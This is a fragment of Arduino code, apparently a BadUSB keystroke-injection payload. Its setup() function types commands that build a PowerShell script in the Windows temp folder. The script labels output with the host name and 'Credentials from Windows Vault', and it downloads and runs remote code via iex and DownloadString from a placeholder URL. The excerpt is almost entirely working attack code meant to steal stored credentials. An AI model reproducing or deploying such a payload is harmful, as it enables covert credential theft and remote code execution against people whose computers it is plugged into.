...
void setup(){
  ...
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Credentials from Windows Vault\" > %temp%\\dlp.ps1");
  ...
  Keyboard.println("echo $pv = iex ((New-Object Net.WebClient).DownloadString(\"INPUT4\")); >> %temp%\\dlp.ps1");
  delay(2000);
